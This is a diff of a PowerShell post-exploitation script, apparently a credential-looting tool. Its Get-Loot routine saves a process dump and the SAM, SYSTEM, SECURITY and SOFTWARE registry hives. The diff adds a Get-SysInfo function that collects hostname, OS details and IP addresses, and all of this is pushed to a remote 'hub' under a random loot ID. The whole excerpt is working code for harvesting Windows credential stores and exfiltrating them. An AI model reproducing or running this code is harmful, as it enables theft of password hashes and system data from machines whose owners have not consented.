@@ -503,14 +503,14 @@ Get-ChildItem | PushTo-Hub -Name "directory-listing"
     end {
         if ($result) {
             {{'Write-Debug "Pushing stdin stream..."'|debug}}
-            if ($result.length -eq 1 -and $result[0] -is [System.String]) {
-                $Body = [system.Text.Encoding]::UTF8.GetBytes($result[0])
-                Send-File $Body $Name
+            if ($result.length -ge 1 -and $result[0] -is [System.String]) {
+                $result = $result -Join "`r`n"
+                $Body = [system.Text.Encoding]::UTF8.GetBytes($result)
             } else {
                 $Body = $result | ConvertTo-Json
                 $Body = [system.Text.Encoding]::UTF8.GetBytes($Body)
-                Send-File $Body $Name
             }
+            Send-File -LootId $LootId $Body $Name
         } else {
             ForEach ($file in $Files) {
                 {{'Write-Debug "Pushing $File..."'|debug}}
@@ -518,11 +518,7 @@ Get-ChildItem | PushTo-Hub -Name "directory-listing"
                 $fileBin = [System.IO.File]::ReadAllBytes($abspath)
                 if ($Name) { $filename = $name } else { $filename = $file }
 
-                if ($LootId) {
-                    Send-File -LootId $LootId $fileBin $filename
-                } else {
-                    Send-File $fileBin $filename
-                }
+                Send-File -LootId $LootId $fileBin $filename
 
             }
         }
@@ -584,6 +580,26 @@ Unmount the Webdav drive.
 }
 
 
+function Get-SysInfo {
+<#
+.SYNOPSIS
+
+Return some basic information about the underlying system
+
+#>
+
+    $IPs = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration | where {$_.DefaultIPGateway -ne $null}).IPAddress
+    $SysInfo = (Get-WMIObject win32_operatingsystem)
+    return  New-Object psobject -Property @{
+        name = $SysInfo.name.split('|')[0];
+        arch = $SysInfo.OSArchitecture;
+        version = $SysInfo.version;
+        hostname = $SysInfo.csname;
+        IPs = $IPs
+    }
+}
+
+
 function Get-Loot {
 <#
 .SYNOPSIS
@@ -597,6 +613,9 @@ Partially based on:
 #>
     $LootId = ""
     1..4 | %{ $LootId += '{0:x}' -f (Get-Random -Max 256) }
+    $SysInfo = Get-SysInfo
+    $SysInfo.IPs = $SysInfo.IPs -Join " "
+    $SysInfo = $SysInfo | ConvertTo-Csv -NoTypeInformation
 
 
     $SamPath = Join-Path $env:TMP "sam"
@@ -634,6 +653,7 @@ Partially based on:
                                                      [IntPtr]::Zero))
         $FileStream.Close()
 
+        $SysInfo | PushTo-Hub -Name "sysinfo" -LootId $LootId
         Foreach ($f in $ProcessDumpPath, $SamPath, $SystemPath, $SecurityPath, $SoftwarePath) {
             if (Test-Path $f) { PushTo-Hub -LootId $LootId $f }
         }
